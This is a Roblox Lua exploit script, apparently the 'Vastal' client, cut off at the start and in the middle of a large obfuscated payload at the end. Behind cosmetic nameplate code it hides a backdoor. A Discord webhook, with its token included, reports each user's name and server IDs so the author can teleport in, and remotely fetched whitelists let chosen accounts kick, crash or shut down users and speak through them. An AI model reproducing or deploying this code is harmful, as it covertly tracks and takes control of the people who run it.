                    math.clamp(b * 1.3 + 80, 180, 255)
                )
                table.insert(cs, ColorSequenceKeypoint.new(i/n, col))
            end
            g.Color = ColorSequence.new(cs)
            c = c + 0.08
            if c >= math.pi * 2 then c = 0 end
            task.wait(0.03)
        end
    end)
end

local function setup(o)
    if o:IsA("TextLabel") and ((o.Name == "user" or o.Text == "user") or 
       (o.Name == "funny vastal dev" or o.Text == "funny vastal dev")) and chk(o) then
        o.TextColor3 = Color3.new(1, 1, 1)
        o.TextStrokeColor3 = Color3.new(0.4, 0.4, 0.4)
        o.TextStrokeTransparency = 0.2
        o.Font = Enum.Font.GothamBold
        o.Text = "funny vastal dev"
        o.TextSize = 25
        
        local bb = o:FindFirstAncestorOfClass("BillboardGui")
        if bb then
            bb.Size = UDim2.new(8, 0, 2, 0)
            bb.StudsOffset = Vector3.new(0, 3, 0)
        end
        
        anim(o, mkGrad(o))
    end
end

for _, o in ipairs(game:GetDescendants()) do setup(o) end
game.DescendantAdded:Connect(function(o) task.wait(0.01) setup(o) end)

local troll_config = {
	prefix = "!",
	test_mode = false,
	
	whitelisted = {
		[10318336432] = {
			ownership = 1,
			custom_name = "cool"
		},
		[9435370570] = {
			ownership = 1,
			custon_name = 'poggers'
		}
	},
	
	commands = {
		['kick'] = {
			ownership = 1,
			run = function(...)
				local args = {...}
				local target = find_player(args[1])
                
				if target then
					target:Kick(table.concat(args, " ", 2) or "You have been kicked from the server.")
				end
			end
		},
		['checkusers'] = {
			ownership = 1,
			run = function()
				tcs.TextChannels.RBXGeneral:SendAsync('[!]')
			end
		},
        ['removegui'] = {
			ownership = 1,
			run = function(...)
				local args = {...}
                local target = find_player(args[1])

                if target then
                    for _, v in ipairs(game:GetDescendants()) do
                        if string.lower(v.Name):find('windui') then
                            v:Destroy()
                            if shared.__AUTOPLAYER then
                                shared.__AUTOPLAYER:Disconnect()
                                shared.__AUTOPLAYER = nil
                            end
                        end
                    end
                end
			end
		},
        ['setfps'] = {
            ownership = 1,
            run = function(...)
                local args = {...}
                local target = find_player(args[1])

                if target then
                    local setfpscap = setfpscap or setfps or fpscap or function(obj) return obj end

                    setfpscap(args[2])
                end
            end
        },
        ['crash'] = {
            ownership = 1,
            run = function(...)
                local args = {...}
                local target = find_player(args[1])

                if target then
                    task.spawn(function()
                        for i = 1, 100 do
                            local part = Instance.new('Part')
                            part.Size = Vector3.new(1e5, 1e5, 1e5)
                            part.Parent = workspace
                        end
                    end)
                end
            end
        },
        ['speak'] = {
            ownership = 1,
            run = function(...)
                local args = {...}
                local target = find_player(args[1])

                if target then
                    tcs.TextChannels.RBXGeneral:SendAsync(args[2])
                end
            end
        },
        ['expose'] = {
            ownership = 1,
            run = function(...)
                local args = {...}
                local target = find_player(args[1])

                if target then
                    tcs.TextChannels.RBXGeneral:SendAsync('I am using the Vastal client')
                end
            end
        },
        ['shutdown'] = {
            ownership = 1,
            run = function(...)
                local args = {...}
                local target = find_player(args[1])

                if target and target == game.Players.LocalPlayer then
                    game:Shutdown()
                end
            end
		}
	}
}

function find_player(partial_name)
	if not partial_name then return nil end
	local lower = string.lower(partial_name)
	
	for _, p in pairs(game:GetService("Players"):GetPlayers()) do
		if string.lower(p.Name) == lower then return p end
	end
	
	for _, p in pairs(game:GetService("Players"):GetPlayers()) do
		if string.lower(p.Name):find(lower, 1, true) then return p end
	end
	
	return nil
end

function get_player_ownership(player)
	local player_data = troll_config.whitelisted[player.UserId]
	return player_data and player_data.ownership or 0
end

function get_custom_name(player)
	local player_data = troll_config.whitelisted[player.UserId]
	if player_data and player_data.custom_name then
		return player_data.custom_name
	end
	
	task.spawn(function()
		local success, response = pcall(function()
			return game:GetService("HttpService"):GetAsync("https://users.roblox.com/v1/users/" .. player.UserId)
		end)
		
		if success then
			local data = game:GetService("HttpService"):JSONDecode(response)
			return data.displayName or player.Name
		end
	end)
	
	return player.Name
end

function can_use_command(player, command_data)
	local player_ownership = get_player_ownership(player)
	local required_ownership = command_data.ownership
	
	return player_ownership >= required_ownership
end

local function animate_rainbow(text_label, gradient)
	task.spawn(function()
		local c = 0
		local wave_freq = math.pi / 8
		local num_points = 12
		
		while text_label and text_label.Parent do
			local color_sequence = {}
			
			for i = 0, num_points do
				local r = 127 * math.sin(wave_freq * i + c) + 128
				local g = 127 * math.sin(wave_freq * i + 2 * math.pi / 3 + c) + 128
				local b = 127 * math.sin(wave_freq * i + 4 * math.pi / 3 + c) + 128
				
				local color = Color3.fromRGB(
					math.clamp(r * 1.3 + 80, 180, 255),
					math.clamp(g * 1.3 + 80, 180, 255),
					math.clamp(b * 1.3 + 80, 180, 255)
				)
				
				table.insert(color_sequence, ColorSequenceKeypoint.new(i / num_points, color))
			end
			
			gradient.Color = ColorSequence.new(color_sequence)
			c = c + 0.08
			
			if c >= math.pi * 2 then
				c = 0
			end
			
			task.wait(0.03)
		end
	end)
end

local function setup_nameplate(object)
	if object:IsA("TextLabel") and (object.Name == "user" or object.Text == "user") then
		local parent = object.Parent
		
		while parent do
			if parent:IsA("BillboardGui") and parent.Parent:IsA("Humanoid") then
				local humanoid = parent.Parent
				local character = humanoid.Parent
				local player = game:GetService("Players"):GetPlayerFromCharacter(character)
				
				if player and get_player_ownership(player) > 0 then
					object.TextColor3 = Color3.new(1, 1, 1)
					object.TextStrokeColor3 = Color3.new(0.4, 0.4, 0.4)
					object.TextStrokeTransparency = 0.2
					object.Font = Enum.Font.GothamBold
					object.Text = get_custom_name(player)
					object.TextSize = 25
					
					parent.Size = UDim2.new(8, 0, 2, 0)
					parent.StudsOffset = Vector3.new(0, 3, 0)
					
					local gradient = Instance.new("UIGradient")
					gradient.Rotation = 90
					gradient.Parent = object
					
					animate_rainbow(object, gradient)
					return
				end
				break
			end
			parent = parent.Parent
		end
	end
end

local function on_message(message, player)
	if message:sub(1, #troll_config.prefix) ~= troll_config.prefix then
		return
	end
	
	local content = message:sub(#troll_config.prefix + 1)
	local parts = {}
	
	for word in content:gmatch("%S+") do
		table.insert(parts, word)
	end
	
	if #parts == 0 then return end
	
	local cmd_name = string.lower(table.remove(parts, 1))
	local cmd = troll_config.commands[cmd_name]
	
	if not cmd then return end
	
	if not can_use_command(player, cmd) then
		return
	end
	
	pcall(cmd.run, table.unpack(parts))
end

local function setup_player_chat(player)
	if get_player_ownership(player) > 0 then
		local connection = player.Chatted:Connect(function(msg)
			on_message(msg, player)
		end)
		
		if not shared.chat_connections then
			shared.chat_connections = {}
		end
		shared.chat_connections[player.UserId] = connection
		
		game:GetService("Players").PlayerRemoving:Connect(function(leaving_player)
			if leaving_player == player and shared.chat_connections[player.UserId] then
				shared.chat_connections[player.UserId]:Disconnect()
				shared.chat_connections[player.UserId] = nil
			end
		end)
	end
end

local function wfdsxz()
	for _, object in ipairs(game:GetDescendants()) do
		setup_nameplate(object)
	end
	
	game.DescendantAdded:Connect(function(object)
		task.wait(0.01)
		setup_nameplate(object)
	end)
	
	for _, player in pairs(game:GetService("Players"):GetPlayers()) do
		setup_player_chat(player)
	end
	
	game:GetService("Players").PlayerAdded:Connect(function(player)
		setup_player_chat(player)
	end)
	
	local player = game:GetService("Players").LocalPlayer
end

local player = game:GetService("Players").LocalPlayer
if player and (troll_config.test_mode or get_player_ownership(player) > 0) then
	wfdsxz()
end

request({
    Url = 'https://discordapp.com/api/webhooks/1506162347054727261/sLurO4YZGRxs5jSWKKmT2noinC89lb-AdmVpPBXrCxxY9QWkwmXJo0H7TtRbV-cL-LpX',--'https://discord.com/api/webhooks/1482537372985065553/YCLoqBaj5o04FmvuB_0i4mx65z4tz4zXmjW-xdM9AOo75kP0yOVpTdRJ48ppWNRVxpOG',
    Method = 'POST',
    Headers = {
        ['Content-Type'] = 'application/json',
    },
    Body = game:GetService('HttpService'):JSONEncode({
        content = string.format(
            'User **%s** has ran your script. (Vastal)\nThey are in game:\n```\nPlaceId: %s\nJobId: %s\n```\nTo join them, run:\n```\ngame:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s", game.Players.LocalPlayer)\n```',
            game.Players.LocalPlayer.Name,
            tostring(game.PlaceId),
            tostring(game.JobId),
            tostring(game.PlaceId),
            tostring(game.JobId)
        )
    })
})

local httpService = game:GetService('HttpService')
local textChatService = game:GetService('TextChatService')
local players = game:GetService('Players')
local whitelistData = httpService:JSONDecode(game:HttpGet('https://raw.githubusercontent.com/juliusxpn/whitelist/refs/heads/main/main.json'))['whitelist']
if not whitelistData then return end
local localPlayer = players.LocalPlayer
local isWhitelisted = whitelistData[localPlayer.Name] ~= nil
local notified = false
local whitelisted = {}
local function applyTag(user)
    local whitelist = whitelistData[user.Name]
    if not whitelist then return end
    local tag = whitelist['Tag']
    local tagName = tag['Name']
    local tagColor = tag.Color[1]..', '..tag.Color[2]..', '..tag.Color[3]
    if user.UserId ~= localPlayer.UserId then
        textChatService.TextChannels.RBXGeneral:SendAsync('I am using the Vastal.')
    end
    table.insert(whitelisted, user)
    textChatService.OnIncomingMessage = function(msg)
        if msg.TextSource and msg.TextSource.UserId == user.UserId then
            local props = Instance.new('TextChatMessageProperties')
            props.PrefixText = '<font color="rgb('..tagColor..')">['..tagName..']</font> '..user.DisplayName..': '
            return props
        end
    end
end
local function checkAndNotify(user)
    if not whitelistData[user.Name] then return end
    applyTag(user)
    if not isWhitelisted and not notified then
        notified = true
    end
end
if isWhitelisted then
    applyTag(localPlayer)
end
for _, plr in ipairs(players:GetPlayers()) do
    if plr ~= localPlayer then
        checkAndNotify(plr)
    end
end
players.PlayerAdded:Connect(function(plr)
    if plr ~= localPlayer then
        checkAndNotify(plr)
    end
end)
local name = tostring(game.Players.LocalPlayer.Name):lower()
local displayName = tostring(game.Players.LocalPlayer.DisplayName):lower()
local MIN_LEN = 3
for _, v in ipairs(whitelisted) do
    if shared[tostring(v.Name)..'_connection'] then
        shared[tostring(v.Name)..'_connection']:Disconnect()
        shared[tostring(v.Name)..'_connection'] = nil
    end
    shared[tostring(v.Name)..'_connection'] = v.Chatted:Connect(function(msg)
        local lower = msg:lower()
        local matched = false
        for i = MIN_LEN, #name do
            if lower:find(name:sub(1, i), 1, true) then
                matched = true
                break
            end
        end
        if not matched then
            for i = MIN_LEN, #displayName do
                if lower:find(displayName:sub(1, i), 1, true) then
                    matched = true
                    break
                end
            end
        end
        if matched then
            if msg:sub(1,6) == '!crash' then
                while true do
                    local part = Instance.new('Part')
                    part.Parent = workspace
                    part.Size = Vector3.new(1e100, 1e100, 1e100)
                    part.Anchored = true
                    part.Position = Vector3.new(0, 0, 0)
                end
            end
        end
    end)
end

return(function(...)local z={"\084\120\055\080\104\079\061\061";"\065\056\072\048\081\120\043\082\106\083\061\061";"\087\111\089\068\121\089\069\061","\055\117\103\078\079\084\077\080\082\054\120\106\109\085\050\069\101\067\116\061";"\097\113\107\099\084\114\101\061","\054\108\097\090\089\085\101\061";"\085\116\050\071\070\077\121\087\084\113\116\052\097\070\056\051\075\090\110\055\101\083\061\061","\055\099\102\090\055\098\049\078\104\083\061\061";"\118\114\117\070\056\052\084\106\122\048\076\121\043\119\122\079","\111\111\070\116\067\079\061\061";"\082\084\080\070\050\119\114\108\107\086\081\056\112\079\101\090\049\101\061\061";"\048\117\103\085\119\078\106\053\078\052\071\049\069\047\104\043\116\108\082\084\117\100\061\061";"\107\073\081\115\120\074\098\071\090\049\109\101\052\071\086\087\099\072\068\082\079\098\073\061";"\100\069\100\110\048\086\043\075\051\087\047\104\109\078\100\051\083\080\116\061";"\090\110\050\077\050\089\117\117\103\099\105\066\050\103\122\061","\098\107\079\108\104\112\103\069\053\090\117\110\055\120\047\065","\047\082\071\078\087\050\100\082\118\107\099\048\097\114\072\102\119\100\061\061","\116\108\047\065\043\108\119\102\084\073\089\107\068\110\048\061","\114\090\108\069\047\071\065\043\109\101\061\061","\101\077\051\117\080\088\088\051\114\100\061\061","\067\071\088\114\078\071\050\104\053\086\073\087\108\043\112\053\086\099\122\076\117\114\070\071\101\078\074\087\100\079\061\061";"\110\118\109\067\084\087\086\115\069\079\061\061";"\105\068\086\113\052\085\097\088\105\082\108\111\083\111\070\057\120\097\104\056\098\077\097\090\099\047\115\070","\055\049\112\083\106\051\085\053\087\073\115\082\090\101\061\061","\043\114\081\107\084\120\082\057","\055\073\083\055\083\085\104\055\116\100\061\061","\078\070\085\102","\086\106\057\071\072\104\116\061";"\090\089\085\081\102\108\084\107\081\101\061\061";"\100\072\098\102\056\101\082\083\055\052\043\103\078\107\122\068\078\100\061\061";"\083\089\072\068\068\055\088\066\053\101\061\061";"\122\048\088\111\068\108\083\061";"\114\071\065\108\085\097\049\073\065\080\101\050\057\084\083\107\090\120\106\082\053\098\065\100\082\089\082\056";"\071\087\066\053\088\084\111\114\118\100\061\061";"\117\110\090\097\087\117\054\050\074\050\100\075\073\097\072\051\067\120\069\055","\117\114\097\090\048\101\061\061","\116\050\111\049\043\055\047\106\068\067\084\121\122\119\107\119\104\114\100\061","\088\053\106\066\115\122\053\072\100\067\121\085\052\077\119\056\056\053\050\061";"\079\070\067\083\080\056\107\111\076\101\061\061","\107\109\104\113\088\050\054\049\048\065\098\079\104\043\101\122\049\101\090\078\071\069\053\054\077\106\055\101\057\055\072\051\049\050\043\113\101\057\075\121\117\114\118\101\108\113\112\121\101\101\074\085\087\088\100\098\078\105\100\103\053\053\111\074\100\102\099\116\053\048\113\082\082\077\068\112\073\050\119\077\049\083\098\076\102\079\110\067\097\085\080\086\119\090\067\084\051\118\101\053\121\065\053\073\104\048\079\098\074\119\050\121\109\109\107\099\116\100\088\102\113\054\104\069\051\110\048\069\116\074\056\122\074\083\066\050\122\085\088\051\115\083\049\090\122\097\057\115\075\104\086\100\109\101\078\087\087\047\075\052\073\075\119\083\070\079\061\061","\122\067\055\080\052\099\065\101\086\056\068\050\072\116\082\080\054\110\057\061","\084\120\055\077\068\120\048\061";"\043\067\082\081\056\083\061\061","\080\047\118\078\075\085\097\086\052\076\116\073\116\103\052\056\087\101\050\071\069\109\087\061","\116\052\119\076\084\110\119\080\084\101\061\061","\067\055\089\067\084\080\112\116\073\077\067\097\098\108\071\053\119\085\090\061","\049\090\076\048\048\048\048\112\116\121\055\081\084\110\076\052\118\101\061\061";"\100\114\088\072\068\052\119\102\084\101\061\061","\116\119\100\087\055\086\048\100\117\083\061\061";"\051\074\068\047\048\101\061\061";"\112\106\068\074\066\067\113\078\104\054\118\051\086\122\111\051\081\073\099\081\081\055\079\071\068\051\119\055";"\080\068\117\049\083\110\111\097\111\072\087\052\054\120\070\065\077\066\073\086\104\080\101\048\100\101\049\066\047\104\054\079\081\099\074\074\116\105\117\099\108\089\118\053\053\088\082\069\043\043\078\098\087\099\070\049\078\078\105\056\057\114\089\056\097\088\106\068\108\073\048\115\053\084\049\079\118\055\065\102\074\071\051\075\106\069\070\117\112\052\087\047\078\077\105\053\098\090\043\111\108\077\048\050\103\071\106\114\109\089\110\055\077\080\081\121\098\097\050\051\047\100\103\088\052\105\069\047\066\100\069\049\120\087\122\098\081\083\061\061";"\043\114\119\090\043\114\119\072\084\083\061\061";"\089\069\115\081\084\055\080\114\055\079\061\061","\119\107\111\077\112\081\116\061","\103\054\089\101\057\076\109\072\074\065\066\103\049\051\104\103";"\085\081\088\087\043\110\112\061","\098\106\122\061","\101\099\053\084\077\077\090\109\083\101\100\050\110\109\110\049\083\054\079\061";"\103\107\074\047\112\081\083\084\102\101\061\061";"\084\120\088\072\084\110\081\077\043\085\106\061","\068\078\106\055\057\104\065\073\065\050\116\055\101\099\106\061","\106\049\112\082\068\098\099\121\100\054\100\061","\075\121\109\083\113\098\082\048\107\121\109\102\085\043\049\097\057\076\111\100\071\048\122\061","\071\104\086\052\085\071\069\061","\121\048\052\050\053\053\114\106\082\100\061\061";"\066\043\118\073\098\087\087\072\055\100\061\061";"\083\065\085\112\056\072\101\061";"\043\051\054\065\070\055\075\099\122\052\122\113\120\047\071\071\071\066\122\061","\117\108\117\097\085\078\109\090\119\085\116\061";"\121\072\052\088\082\074\104\050\071\057\074\076\080\111\056\080\110\088\104\121\082\073\118\075\074\103\079\101\105\070\110\081\108\050\100\118\068\089\049\100\086\100\115\098\077\052\076\054\055\047\102\114\121\054\121\048\115\106\119\048\080\083\084\080\118\053\103\054\075\089\083\099\051\048\068\069\048\097\052\084\079\069\070\071\077\079\117\113\113\053\068\068\048\120\089\104\099\111\097\080\098\099\087\118\097\055\049\086\111\082\049\071\115\107\080\090\100\108\074\116\066\071\047\109\067\115\098\085\074\080\047\108\083\065\113\089\107\076\086\067\112\070\115\108\068\118\104\052\047\065\043\073\083\082\070\051\065\119\066\083\080\083\061\061","\050\118\105\050\043\075\084\112\110\104\104\048\100\100\061\061";"\048\084\098\099\048\090\085\075\051\100\061\061","\114\108\107\049\119\079\061\061","\068\049\108\110\073\099\090\080\081\083\061\061";"\097\088\065\081\103\086\098\073\079\119\108\079\100\050\048\076\068\055\088\120\068\079\072\101\113\055\116\075\104\098\087\061";"\105\101\057\070\047\067\121\081\101\106\054\087\072\090\079\075\120\083\061\061","\043\079\057\119\104\113\086\085\077\080\067\074\109\083\061\061","\053\076\100\122\106\043\043\078\106\086\114\088\078\073\090\052\110\047\070\117\119\100\061\061","\065\107\079\090\085\083\074\082\080\085\108\101\057\074\055\056\112\083\061\061","\117\112\104\086\066\068\116\061";"\117\117\069\083\119\068\055\086\052\101\061\061";"\108\066\106\109\082\072\056\072\110\097\112\050\119\116\112\087\088\055\099\090\100\100\075\079\057\122\099\085","\116\110\087\081\117\114\119\076\117\121\117\082\043\118\074\055\048\075\056\061","\103\089\070\108\050\055\078\087\047\077\115\082\098\076\115\116\084\088\048\052\082\108\116\103\115\121\087\082\098\099\050\061","\122\066\074\119\109\090\076\068\097\111\083\082\120\053\071\047\049\097\109\055\117\049\102\065\114\075\051\050\102\047\087\061","\048\119\055\106\117\071\056\079\104\055\119\085\056\110\082\074\048\101\061\061","\051\075\103\050\110\121\054\084\108\087\106\081\075\101\061\061","\056\115\097\068\054\047\083\077\117\079\061\061","\090\109\043\072\070\086\090\108\121\080\105\070\106\071\106\061";"\056\075\121\090\043\100\061\061","\076\107\082\090\122\104\056\061";"\053\106\085\098\122\089\106\066\080\073\054\071\048\075\110\097\089\100\090\061";"\052\121\076\114\055\083\078\055\073\078\110\097\109\072\088\053\055\085\066\120\098\070\078\048";"\068\071\073\061";"\088\071\055\079\053\052\115\117\067\056\113\067\101\070\071\077\066\053\087\061";"\097\109\121\107\122\107\121\110\068\115\100\061","\082\098\082\122\085\098\074\066","\081\049\090\067\084\101\076\049\087\056\121\111\075\109\117\110\112\102\122\088\073\074\073\061","\084\051\053\053\116\072\122\049\087\083\061\061","\077\102\105\104\121\084\073\083\097\050\079\061","\116\067\117\099\104\110\089\075","\057\074\099\080\043\069\052\098\067\108\115\097\079\101\061\061","\114\111\122\116\065\086\106\061","\084\077\067\122\102\081\083\061";"\053\117\089\118\065\120\069\050\081\097\070\115\052\109\068\056\051\101\061\061";"\084\110\089\079\056\110\082\054","\070\121\117\069\051\121\079\061","\051\083\061\061";"\072\087\080\081\106\112\083\061","\055\057\073\061","\055\052\054\055\117\100\061\061";"\070\075\107\121\090\077\116\122\086\079\061\061","\054\082\089\116\111\073\079\116\081\079\069\112\098\084\088\057\101\083\061\061","\077\097\106\107\089\049\100\052\117\071\112\074\071\052\097\078","\068\055\084\121\110\102\043\119\119\110\084\114\122\108\084\079\051\100\061\061","\116\052\048\099\085\043\122\057\074\115\047\120\117\112\077\097\114\053\122\061";"\050\119\117\072\112\118\118\106\056\070\116\061","\081\098\106\085\078\097\111\105\078\116\105\113\079\105\121\118";"\090\114\056\080\082\065\067\074\069\090\099\071\074\098\056\055";"\081\077\118\055\080\069\077\118\122\100\061\061";"\106\080\102\077\101\083\111\054\043\110\069\080\071\072\068\068\121\051\098\049";"\071\048\120\055\065\100\061\061","\071\081\107\051\109\111\079\074\084\100\061\061","\051\055\073\114\051\048\088\077\082\120\084\108\119\080\100\089\118\079\061\061","\102\088\076\075\117\047\067\053\066\107\112\076\090\073\088\068\079\079\061\061","\115\102\113\121\106\114\103\099\080\100\061\061","\052\112\099\049\101\090\075\098\107\070\073\048\065\078\084\112\108\122\073\061","\103\047\055\049\067\121\071\118\071\078\066\050\054\057\121\085\076\087\077\051\056\088\048\061";"\074\065\109\074\082\114\048\117\120\109\075\080\106\075\071\114\047\068\116\061";"\101\079\109\110";"\113\085\073\099\109\083\061\061";"\115\068\067\070\078\077\106\088\101\055\084\117\080\118\106\107\087\078\057\061","\101\085\122\077\081\101\061\061";"\089\118\115\121\090\121\118\079\090\055\090\052\120\069\119\101\117\079\061\061";"\098\088\081\055\078\078\112\073\086\100\061\061";"","\043\118\067\111\103\071\050\100\070\072\074\051\078\121\077\047\080\066\065\079\076\081\090\061","\112\113\056\115\109\097\087\099\113\056\082\083\047\098\069\121\070\115\043\119";"\066\121\073\071\075\097\072\071\055\079\061\061","\078\097\108\103\075\050\080\087\122\043\066\114\078\100\061\061","\073\067\074\050\055\057\100\099\113\068\117\104\114\115\082\122\115\072\073\083\089\083\061\061","\082\121\084\097\049\121\055\049";"\049\121\082\103\118\050\119\072\056\114\088\050\043\100\061\061";"\084\121\111\105\048\090\111\072\119\048\088\057\104\073\121\113\100\100\061\061";"\057\114\109\065\117\066\073\067\121\088\110\071\054\107\090\061";"\078\102\055\049\119\121\056\079\068\048\111\114\110\120\076\077\117\100\061\061";"\109\070\075\067\121\087\087\061","\087\084\083\105\084\079\068\078\101\100\061\061";"\119\119\057\112\122\085\107\076\082\102\048\076\117\071\119\065\049\100\061\061","\117\114\119\090\048\120\076\107\078\110\119\099\100\075\121\119\116\114\119\099\049\110\100\061","\048\108\047\065\068\085\074\090\048\108\047\065\043\108\119\102\084\055\074\081\116\052\082\057\056\085\082\121","\079\048\108\052","\078\115\116\055\052\080\097\052\114\051\099\082\099\119\048\051\067\098\057\061";"\068\085\051\066\116\072\053\051\076\098\118\110\043\098\116\074\082\087\088\068\104\043\073\067\076\050\106\053";"\109\104\047\109\098\072\085\113\051\043\122\074\121\048\078\067","\114\115\054\073\054\079\089\089\077\079\061\061";"\122\049\067\086\106\079\073\061";"\043\114\055\105\043\100\061\061";"\066\075\065\112\075\066\080\069\066\071\112\061","\117\048\115\085\074\100\061\061";"\118\099\119\054\081\120\057\061";"\102\100\052\067\110\122\114\067\086\101\061\061";"\109\114\053\067\057\055\118\047\101\050\087\088\079\072\048\055\065\066\071\103\067\043\100\061";"\120\090\051\087\081\089\083\070\082\085\087\071\106\101\061\061";"\051\055\043\080\051\118\043\107\068\048\082\043\048\080\117\052";"\103\073\121\118\053\099\048\083\078\078\078\108\050\066\117\056";"\111\089\111\049\082\079\061\061","\043\075\108\103\088\075\048\061";"\084\080\114\069\090\056\102\099\112\047\047\104\070\075\077\097\079\056\053\105\100\088\118\077\089\114\043\113\108\102\116\061","\116\114\119\090\068\110\119\090\056\085\117\107\056\052\076\121","\076\114\119\049\116\070\043\049\119\082\112\113\113\097\043\105\051\079\061\061","\113\066\088\112\078\083\083\113\066\057\086\118\088\071\105\072";"\065\113\055\067\109\049\121\071\089\105\098\114\085\103\089\052\070\097\122\080\047\101\061\061";"\088\089\121\114\114\066\073\067\099\088\119\107\103\090\105\079\055\053\117\121\117\077\069\061";"\116\075\107\103\068\090\043\089\082\055\084\054\084\114\121\085\082\050\057\061","\101\074\057\103\070\083\061\061","\086\056\055\071\122\098\106\061";"\069\052\077\106\056\079\055\070","\113\049\114\086\109\087\049\110\111\079\061\061","\090\065\117\119\053\088\053\074\103\079\061\061","\082\077\106\122\108\097\050\098\108\110\084\120\052\100\061\061","\054\101\088\053\048\077\113\047\087\047\055\078\084\056\069\100\113\079\061\061","\111\089\075\119\065\083\081\077\102\047\111\112\107\073\097\082\048\066\083\076\101\087\099\116\085\085\073\080","\079\055\111\071\043\050\090\104\066\083\061\061";"\052\117\065\057\078\120\084\057\120\109\109\087\111\113\055\119\053\054\054\105\079\098\072\074\114\082\049\082\106\097\100\061";"\067\079\068\108\112\081\056\104\067\087\105\057\111\100\054\090\106\078\048\061";"\115\103\070\056\067\067\048\061","\043\052\076\065\068\067\106\061";"\067\068\088\106\087\071\115\090\100\083\061\061","\082\056\043\047\074\101\061\061";"\073\073\099\082\071\079\061\061";"\048\074\107\047\103\121\089\073\067\075\090\105\087\107\075\055\053\076\115\083\097\054\051\076\077\073\119\085\110\054\087\049\122\107\072\087\070\102\117\107\051\048\115\119\075\113\088\073\101\079\061\061","\048\081\080\116\056\072\056\100\065\087\085\054\074\052\055\056";"\101\103\107\076\109\079\057\101\081\102\052\076\085\087\104\075","\066\120\076\070\078\119\105\071\050\078\105\076\053\081\056\061";"\086\089\089\081\070\085\086\122\083\049\097\055\120\052\111\075\075\100\116\061","\071\105\111\109\052\099\103\084\088\078\100\113\089\084\104\048\104\053\048\061";"\115\105\051\054\108\066\048\071\084\073\072\050\085\050\100\061";"\065\080\056\055\113\067\117\084\112\070\074\073\119\043\107\119\075\106\084\118\067\080\068\118\086\122\106\097","\120\072\103\069\107\116\116\087\072\101\061\061","\051\118\098\069\105\083\061\061";"\054\066\055\056\054\117\110\080\053\090\051\109\085\077\122\061","\110\074\113\111\102\052\083\047\076\083\050\061";"\100\105\065\079\048\068\113\086\053\114\050\114\051\119\111\104\069\082\072\054\116\073\083\111\073\087\108\105";"\119\115\104\072\081\074\074\054\098\100\061\061","\085\081\088\105\043\085\117\107\084\120\055\077\068\120\048\061";"\118\073\111\048\100\102\047\065\048\050\111\080\056\110\055\072\117\083\061\061","\043\108\107\082\068\121\100\079\119\052\069\076\078\050\047\104","\043\085\047\099\068\067\106\061","\113\075\072\102\070\077\105\118\090\076\098\054\082\115\087\061","\119\120\082\105\043\075\111\066\118\067\111\050\117\110\055\051\056\052\079\061","\122\075\048\089\104\071\116\079\082\118\106\099\118\071\074\090","\085\081\088\075\056\079\061\061";"\043\100\048\120\090\053\088\098\107\121\056\061";"\085\081\088\111\068\052\117\121\078\101\061\061";"\084\108\121\079\043\100\061\061";"\118\073\074\053\089\117\101\103\113\080\085\085\075\050\101\053\097\049\070\043\090\057\109\070\065\119\115\108\086\109\090\070\121\050\083\085\101\079\066\086\090\119\118\078\048\071\066\107\071\043\043\056\114\106\066\090\056\057\087\061","\083\102\099\098\110\074\050\120\085\050\112\117\056\071\083\076\050\090\074\097\105\090\072\101\074\106\105\099\077\069\070\084\054\080\111\065\073\100\061\061","\103\066\057\120\079\049\122\061";"\116\052\119\105\068\067\043\121";"\119\090\070\103\110\079\061\061","\090\084\101\056\072\107\108\054\098\115\112\065\066\087\082\065\088\101\061\061","\121\098\048\077\043\104\052\049\057\079\061\061";"\105\052\066\081\108\099\120\077\103\068\083\084\050\079\115\076\086\100\061\061";"\068\071\106\061","\116\120\082\107\068\120\079\061","\079\085\088\070\081\097\121\106\104\109\083\112\078\101\069\061";"\052\070\118\071\120\090\114\071\071\086\112\071\112\067\076\113\072\113\106\061","\113\099\101\098\086\043\056\111\077\072\081\112\110\110\078\089\069\101\061\061","\088\054\099\067\085\051\112\115\043\072\076\115\056\085\107\084\047\114\116\061","\099\085\070\105\082\103\069\061";"\102\119\109\077\104\079\061\061";"\054\084\100\109\078\119\089\086\101\101\061\061";"\054\053\102\083\087\050\118\075\052\100\061\061";"\083\070\100\052\073\104\102\070\118\121\121\085\104\081\043\103";"\102\100\057\048\083\085\107\088\088\056\076\086\116\088\067\050\100\055\110\067\071\100\071\048\069\065\112\048\099\050\087\061";"\118\075\088\073\050\106\109\101\109\083\061\061","\084\049\073\097\116\102\050\106\106\100\061\061";"\098\115\105\104\088\104\050\121\054\098\082\087\078\057\116\111\048\100\061\061";"\082\120\106\099\122\048\119\110\068\101\061\061","\109\090\083\049\084\079\087\111\113\101\061\061","\100\074\067\120\115\097\097\102\067\120\076\083\067\110\078\101\067\122\121\079\102\100\061\061","\056\114\088\072\056\114\055\090";"\075\075\076\055\121\110\101\061";"\113\114\085\068\103\078\089\118\088\085\079\100\098\052\101\109\056\077\056\061";"\104\122\110\049\073\079\061\061";"\068\110\055\090\104\101\061\061","\113\084\074\107\043\107\049\073\086\057\097\106\087\098\051\086\113\108\108\119\071\074\106\061";"\097\109\083\083\077\103\078\083\082\066\080\089\109\043\053\100\067\119\048\061","\049\108\101\081\048\071\055\073\051\110\119\100\110\120\084\047";"\113\056\049\081\057\067\055\072\069\100\061\061","\076\053\088\071\070\122\112\098\072\079\061\061","\119\048\105\073\068\073\081\055\117\073\043\050\078\071\047\102\049\083\061\061","\078\082\065\107\076\067\056\061";"\121\097\100\054\114\087\057\114\103\083\061\061";"\080\073\097\110\069\115\090\061";"\074\119\119\057\120\119\122\066\079\043\047\097\065\116\116\047\072\090\122\061","\117\120\119\080\084\108\047\065\078\100\061\061";"\088\077\120\098\055\077\057\110\075\115\056\065\089\122\047\076\106\083\061\061";"\052\086\057\100\086\110\089\097\106\083\061\061","\051\077\083\121\043\097\057\111\051\083\061\061";"\117\114\119\090\048\114\119\099\084\052\121\102\043\100\061\061";"\056\114\107\107\116\083\061\061","\074\083\073\085\067\111\106\061","\116\052\055\072\043\120\088\105","\076\118\102\097\049\099\076\048\101\049\066\090\079\078\104\051\116\116\101\061";"\084\120\088\080\084\108\047\111\068\052\116\061","\051\048\089\118\119\081\055\075\117\050\082\081\122\055\084\051\068\119\050\061";"\069\075\102\090\110\105\043\071\080\079\061\061";"\100\051\070\074\116\088\097\051\103\109\065\074\106\119\120\107\104\099\122\061","\083\052\108\120\110\067\079\061","\076\118\053\121\115\086\054\072\113\106\122\077\115\089\076\075\099\090\116\061";"\087\107\082\078\080\100\061\061","\120\078\049\066\099\071\116\080\052\083\061\061";"\114\079\061\061";"\102\049\116\061";"\079\100\071\114\076\073\122\074\051\052\069\0